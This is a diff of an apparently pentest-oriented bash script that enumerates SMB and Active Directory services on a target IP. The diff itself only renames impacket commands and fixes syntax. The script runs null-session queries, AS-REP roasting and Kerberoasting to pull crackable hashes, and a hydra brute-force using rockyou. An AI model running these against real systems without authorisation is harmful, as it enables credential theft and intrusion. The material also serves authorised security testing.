@@ -45,11 +45,13 @@ smbclient -N -L //$ip >> SMB_enum.out
 echo "%%%" >> SMB_enum.out
 smbclient -N //$ip/ --option="client min protocol"=LANMAN1 >> SMB_enum.out
 echo "%%%" >> SMB_enum.out
+
 #rpc auth without creds
 rpcclient $ip
 echo "%%%" >> SMB_enum.out
 rpcclient -U "" $ip
 echo "%%%" >> SMB_enum.out
+
 # cme without creds
 crackmapexec smb $ip
 echo "%%%" >> SMB_enum.out
@@ -57,15 +59,17 @@ crackmapexec smb $ip --pass-pol -u "" -p ""
 echo "%%%" >> SMB_enum.out
 crackmapexec smb $ip --pass-pol -u "guest" -p ""
 echo "%%%" >> SMB_enum.out
+
 # more enum
-GetADUsers.py -dc-ip $ip "{Domain_Name}/" -all >> SMB_enum.out
+impacket-GetADUsers -dc-ip $ip "{Domain_Name}/" -all >> SMB_enum.out
 echo "%%%" >> SMB_enum.out
-GetNPUsers.py -dc-ip $ip -request "{Domain_Name}/" -format hashcat >> SMB_enum.out
+impacket-GetNPUsers -dc-ip $ip -request "{Domain_Name}/" -format hashcat >> SMB_enum.out
 echo "%%%" >> SMB_enum.out
-GetUserSPNs.py -dc-ip $ip -request "{Domain_Name}/" >> SMB_enum.out
+impacket-GetUserSPNs -dc-ip $ip -request "{Domain_Name}/" >> SMB_enum.out
 echo "%%%" >> SMB_enum.out
-getArch.py -target $ip >> SMB_enum.out
+impacket-getArch -target $ip >> SMB_enum.out
 echo "%%%" >> SMB_enum.out
+
 # run enum4linux to get General SMB info
 enum4linux -a $ip
 echo "%%%" >> SMB_enum.out
@@ -112,7 +116,7 @@ then
 	echo -e "\n===== RUNNING HYDRA BRUITFORCE=====\n" > SMB_hydra.out
 	hydra -t 1 -V -f -l $User -P /usr/share/wordlists/rockyou.txt $ip smb >> SMB_hydra.out
 else
-	echo("no user provided, plese use '-h' option to see usage")
+	echo "no user provided, plese use '-h' option to see usage"
 fi
 
 echo -e "\n********** FINISHED **********\n"
